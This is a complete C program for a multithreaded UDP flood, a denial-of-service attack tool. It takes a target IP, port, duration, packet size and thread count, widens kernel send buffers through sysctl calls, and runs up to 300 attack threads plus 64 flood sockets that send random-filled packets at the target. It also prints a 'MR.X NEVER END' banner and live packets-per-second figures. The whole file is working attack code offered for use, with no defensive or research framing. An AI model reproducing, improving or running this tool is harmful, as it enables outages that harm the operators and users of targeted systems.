#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <pthread.h>
#include <time.h>
#include <fcntl.h>
#include <stdatomic.h>
#include <sched.h>
#include <errno.h>
#include <sys/time.h>

#define BUFFER_COUNT 768
#define FLOOD_SOCKETS 64
#define MAX_PPS_PER_THREAD 22000
#define WARMUP_SECONDS 1
#define MIN_PACKET_SIZE 20
#define MAX_PACKET_SIZE 1024
#define MIN_THREADS 10
#define MAX_THREADS 300
#define MIN_ATTACK_TIME 1
#define MAX_ATTACK_TIME 300

char *TARGET_IP;
int TARGET_PORT;
int ATTACK_TIME;
int PACKET_SIZE;
int THREAD_COUNT;

_Atomic unsigned long long total_packets = 0;
_Atomic unsigned long long total_bytes = 0;
_Atomic unsigned long long peak_pps = 0;
_Atomic int stop_signal = 0;
_Atomic int warmup_complete = 0;
_Atomic int attack_active = 0;

char *buffers[BUFFER_COUNT];
struct sockaddr_in target_addr;

void optimize_kernel() {
    #ifdef __linux__
    system("sysctl -w net.core.wmem_max=536870912 >/dev/null 2>&1");
    system("sysctl -w net.core.wmem_default=33554432 >/dev/null 2>&1");
    system("sysctl -w net.core.netdev_max_backlog=1000000 >/dev/null 2>&1");
    system("sysctl -w net.ipv4.udp_mem='16777216 16777216 16777216' >/dev/null 2>&1");
    #endif
}

int get_buf_size(int ps, int tc, int w) {
    long long r = w ? 50000LL : MAX_PPS_PER_THREAD;
    if (r > 1000000LL) r = 1000000LL;
    
    long long b = r * (long long)ps;
    if (b > 1000000000LL) b = 1000000000LL;
    
    long long c = (b * 50LL) / 1000LL;
    if (c < 1048576LL) c = 1048576LL;
    
    int result = (int)(c > 2147483647LL ? 134217728 : c);
    
    if (tc > 100) result = result * 3 / 2;
    else if (tc > 50) result = result * 5 / 4;
    
    if (ps < 64) result = result * 2;
    else if (ps < 128) result = result * 3 / 2;
    
    int minb = 1048576;
    int maxb = 134217728;
    
    if (result < minb) result = minb;
    if (result > maxb) result = maxb;
    
    int opts[] = {result, result/2, result/4, 16777216, 8388608, 4194304, 2097152, 1048576};
    for (int i = 0; i < 8; i++) {
        if (opts[i] >= minb && opts[i] <= maxb) return opts[i];
    }
    return minb;
}

void set_sock_buf(int sock, int ps, int tc, int w) {
    int buf = get_buf_size(ps, tc, w);
    while (buf >= 1048576) {
        if (setsockopt(sock, SOL_SOCKET, SO_SNDBUF, &buf, sizeof(buf)) == 0) break;
        buf = buf / 2;
    }
}

void fill_data(char *buf, int sz, unsigned int sd) {
    for (int i = 0; i < sz; i++) {
        sd = (sd * 1103515245 + 12345);
        buf[i] = (char)((sd >> 16) & 0xFF);
    }
}

void *flood_start(void *arg) {
    int socks[FLOOD_SOCKETS];
    for (int i = 0; i < FLOOD_SOCKETS; i++) socks[i] = -1;
    
    char *pkt = malloc(PACKET_SIZE);
    if (!pkt) {
        atomic_store(&warmup_complete, 1);
        atomic_store(&attack_active, 1);
        return NULL;
    }
    
    fill_data(pkt, PACKET_SIZE, time(NULL) ^ getpid());
    
    for (int i = 0; i < FLOOD_SOCKETS; i++) {
        socks[i] = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
        if (socks[i] < 0) {
            socks[i] = -1;
            continue;
        }
        
        int opt = 1;
        setsockopt(socks[i], SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt));
        set_sock_buf(socks[i], PACKET_SIZE, FLOOD_SOCKETS, 1);
        
        int flg = fcntl(socks[i], F_GETFL, 0);
        if (flg >= 0) fcntl(socks[i], F_SETFL, flg | O_NONBLOCK);
        
        #ifdef __linux__
        int prio = 0;
        setsockopt(socks[i], SOL_SOCKET, SO_PRIORITY, &prio, sizeof(prio));
        #endif
        
        for (int j = 0; j < 30; j++) {
            sendto(socks[i], pkt, PACKET_SIZE, MSG_DONTWAIT,
                  (struct sockaddr*)&target_addr, sizeof(target_addr));
        }
    }
    
    struct timeval st, ct;
    gettimeofday(&st, NULL);
    
    for (int sec = 0; sec < WARMUP_SECONDS; sec++) {
        gettimeofday(&ct, NULL);
        long st_us = st.tv_sec * 1000000 + st.tv_usec;
        
        while (1) {
            gettimeofday(&ct, NULL);
            long ct_us = ct.tv_sec * 1000000 + ct.tv_usec;
            if ((ct_us - st_us) >= (sec + 1) * 1000000) break;
            
            for (int i = 0; i < FLOOD_SOCKETS; i++) {
                if (socks[i] < 0) continue;
                
                int burst = (PACKET_SIZE < 64) ? 100 : 70;
                for (int b = 0; b < burst; b++) {
                    int ret = sendto(socks[i], pkt, PACKET_SIZE, MSG_DONTWAIT,
                                    (struct sockaddr*)&target_addr, sizeof(target_addr));
                    
                    if (ret > 0) {
                        atomic_fetch_add(&total_packets, 1);
                        atomic_fetch_add(&total_bytes, PACKET_SIZE);
                    }
                }
            }
            usleep(150);
        }
    }
    
    atomic_store(&warmup_complete, 1);
    
    while (atomic_load(&stop_signal) == 0) {
        for (int i = 0; i < FLOOD_SOCKETS; i++) {
            if (socks[i] < 0) continue;
            
            int burst = (PACKET_SIZE < 64) ? 80 : 50;
            for (int b = 0; b < burst; b++) {
                sendto(socks[i], pkt, PACKET_SIZE, MSG_DONTWAIT,
                      (struct sockaddr*)&target_addr, sizeof(target_addr));
            }
        }
        usleep(80);
    }
    
    for (int i = 0; i < FLOOD_SOCKETS; i++) {
        if (socks[i] >= 0) close(socks[i]);
    }
    
    free(pkt);
    return NULL;
}

int init_buffers() {
    if (PACKET_SIZE < MIN_PACKET_SIZE) PACKET_SIZE = MIN_PACKET_SIZE;
    if (PACKET_SIZE > MAX_PACKET_SIZE) PACKET_SIZE = MAX_PACKET_SIZE;
    
    unsigned int base = time(NULL) ^ getpid();
    
    for (int i = 0; i < BUFFER_COUNT; i++) {
        buffers[i] = malloc(PACKET_SIZE);
        if (!buffers[i]) {
            for (int j = 0; j < i; j++) free(buffers[j]);
            return 0;
        }
        fill_data(buffers[i], PACKET_SIZE, base ^ (i * 1234567));
    }
    return 1;
}

void cleanup_buffers() {
    for (int i = 0; i < BUFFER_COUNT; i++) {
        if (buffers[i]) {
            free(buffers[i]);
            buffers[i] = NULL;
        }
    }
}

void *attack_thread(void *arg) {
    int tid = *((int *)arg);
    
    #ifdef __linux__
    cpu_set_t cs;
    CPU_ZERO(&cs);
    int c = sysconf(_SC_NPROCESSORS_ONLN);
    if (c > 0) {
        CPU_SET(tid % c, &cs);
        pthread_setaffinity_np(pthread_self(), sizeof(cpu_set_t), &cs);
    }
    #endif
    
    int s = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    if (s < 0) return NULL;
    
    int o = 1;
    setsockopt(s, SOL_SOCKET, SO_REUSEADDR, &o, sizeof(o));
    set_sock_buf(s, PACKET_SIZE, THREAD_COUNT, 0);
    
    int f = fcntl(s, F_GETFL, 0);
    if (f >= 0) fcntl(s, F_SETFL, f | O_NONBLOCK);
    
    #ifdef __linux__
    int p = -15;
    setsockopt(s, SOL_SOCKET, SO_PRIORITY, &p, sizeof(p));
    #endif
    
    time_t start = time(NULL);
    int idx = tid % BUFFER_COUNT;
    
    int burst = (PACKET_SIZE < 64) ? 180 : (PACKET_SIZE < 128) ? 120 : 80;
    int sleep_us = (PACKET_SIZE < 64) ? 12 : (PACKET_SIZE < 128) ? 18 : 25;
    
    unsigned long packets_this_sec = 0;
    time_t last_sec = time(NULL);
    
    while (!atomic_load(&stop_signal) && (time(NULL) - start) < ATTACK_TIME) {
        time_t now = time(NULL);
        if (now != last_sec) {
            packets_this_sec = 0;
            last_sec = now;
        }
        
        if (packets_this_sec >= MAX_PPS_PER_THREAD) {
            usleep(10000);
            continue;
        }
        
        int sent = 0;
        for (int i = 0; i < burst && packets_this_sec < MAX_PPS_PER_THREAD; i++) {
            int r = sendto(s, buffers[idx], PACKET_SIZE, MSG_DONTWAIT,
                         (struct sockaddr *)&target_addr, sizeof(target_addr));
            
            if (r > 0) {
                idx = (idx + 1) % BUFFER_COUNT;
                packets_this_sec++;
                sent++;
                atomic_fetch_add(&total_packets, 1);
                atomic_fetch_add(&total_bytes, PACKET_SIZE);
            }
        }
        
        if (sent > burst / 2) {
            if (sleep_us > 8) sleep_us--;
        } else {
            sleep_us += 3;
            if (sleep_us > 100) sleep_us = 100;
        }
        
        usleep(sleep_us);
    }
    
    close(s);
    return NULL;
}

void *stats_monitor(void *arg) {
    while (!atomic_load(&attack_active)) usleep(10000);
    
    sleep(1);
    unsigned long long base_packets = atomic_load(&total_packets);
    unsigned long long base_bytes = atomic_load(&total_bytes);
    
    printf("\n🚀 MR.X NEVER END 🚀 Starting.....\n\n");
    
    unsigned long long prev_packets = base_packets;
    unsigned long long prev_bytes = base_bytes;
    
    for (int sec = 1; sec <= ATTACK_TIME && !atomic_load(&stop_signal); sec++) {
        sleep(1);
        
        unsigned long long curr_packets = atomic_load(&total_packets);
        unsigned long long curr_bytes = atomic_load(&total_bytes);
        
        unsigned long long pps = curr_packets - prev_packets;
        unsigned long long bytes_diff = curr_bytes - prev_bytes;
        
        if (pps > atomic_load(&peak_pps)) {
            atomic_store(&peak_pps, pps);
        }
        
        double mbps = (bytes_diff * 8.0) / (1024.0 * 1024.0);
        double pps_k = pps / 1000.0;
        double peak_k = atomic_load(&peak_pps) / 1000.0;
        
        printf("🔥 PPS: %.0fK | 📈 Peak: %.0fK | ⚡%.1fMBps\n", pps_k, peak_k, mbps);
        fflush(stdout);
        
        prev_packets = curr_packets;
        prev_bytes = curr_bytes;
    }
    
    unsigned long long total_p = atomic_load(&total_packets);
    unsigned long long total_b = atomic_load(&total_bytes);
    unsigned long long peak = atomic_load(&peak_pps);
    
    printf("\n🎉 ALL COMPLETED\n\n");
    
    double avg_pps = (total_p - base_packets) / (double)ATTACK_TIME;
    double total_mb = total_b / (1024.0 * 1024.0);
    
    printf("📊 Total packets: %llu\n", total_p);
    printf("💾 Total data: %.2f MB\n", total_mb);
    printf("🚀 Peak PPS: %.0fK\n", peak / 1000.0);
    printf("⚡ Average PPS: %.0fK\n\n", avg_pps / 1000.0);
    
    printf("🔥❤️ MR.X NEVER END ❤️🔥\n");
    
    return NULL;
}

int main(int argc, char *argv[]) {
    if (argc != 6) {
        printf("Usage: %s IP PORT TIME SIZE THREADS\n", argv[0]);
        printf("Example: %s 1.2.3.4 12345 300 64 100\n", argv[0]);
        return 1;
    }
    
    TARGET_IP = argv[1];
    TARGET_PORT = atoi(argv[2]);
    ATTACK_TIME = atoi(argv[3]);
    PACKET_SIZE = atoi(argv[4]);
    THREAD_COUNT = atoi(argv[5]);
    
    if (ATTACK_TIME < MIN_ATTACK_TIME) ATTACK_TIME = MIN_ATTACK_TIME;
    if (ATTACK_TIME > MAX_ATTACK_TIME) ATTACK_TIME = MAX_ATTACK_TIME;
    if (PACKET_SIZE < MIN_PACKET_SIZE) PACKET_SIZE = MIN_PACKET_SIZE;
    if (PACKET_SIZE > MAX_PACKET_SIZE) PACKET_SIZE = MAX_PACKET_SIZE;
    if (THREAD_COUNT < MIN_THREADS) THREAD_COUNT = MIN_THREADS;
    if (THREAD_COUNT > MAX_THREADS) THREAD_COUNT = MAX_THREADS;
    
    memset(&target_addr, 0, sizeof(target_addr));
    target_addr.sin_family = AF_INET;
    target_addr.sin_port = htons(TARGET_PORT);
    
    if (inet_pton(AF_INET, TARGET_IP, &target_addr.sin_addr) <= 0) {
        printf("Invalid IP address\n");
        return 1;
    }
    
    printf("Target: %s:%d | Time: %ds\n", TARGET_IP, TARGET_PORT, ATTACK_TIME);
    printf("Packet: %d bytes | Threads: %d\n", PACKET_SIZE, THREAD_COUNT);
    
    optimize_kernel();
    
    if (!init_buffers()) {
        printf("Buffer initialization failed\n");
        return 1;
    }
    
    pthread_t flood_thread;
    pthread_create(&flood_thread, NULL, flood_start, NULL);
    
    pthread_t *threads = malloc(THREAD_COUNT * sizeof(pthread_t));
    int *tids = malloc(THREAD_COUNT * sizeof(int));
    
    if (!threads || !tids) {
        cleanup_buffers();
        printf("Memory allocation failed\n");
        return 1;
    }
    
    for (int i = 0; i < THREAD_COUNT; i++) {
        tids[i] = i;
        pthread_create(&threads[i], NULL, attack_thread, &tids[i]);
        if (i % 25 == 0 && i > 0) usleep(1000);
    }
    
    printf("Created %d attack threads\n", THREAD_COUNT);
    
    atomic_store(&attack_active, 1);
    
    pthread_t monitor_thread;
    pthread_create(&monitor_thread, NULL, stats_monitor, NULL);
    
    sleep(ATTACK_TIME + 3);
    
    atomic_store(&stop_signal, 1);
    usleep(200000);
    
    for (int i = 0; i < THREAD_COUNT; i++) {
        pthread_join(threads[i], NULL);
    }
    
    pthread_join(flood_thread, NULL);
    pthread_join(monitor_thread, NULL);
    
    cleanup_buffers();
    free(threads);
    free(tids);
    
    return 0;
}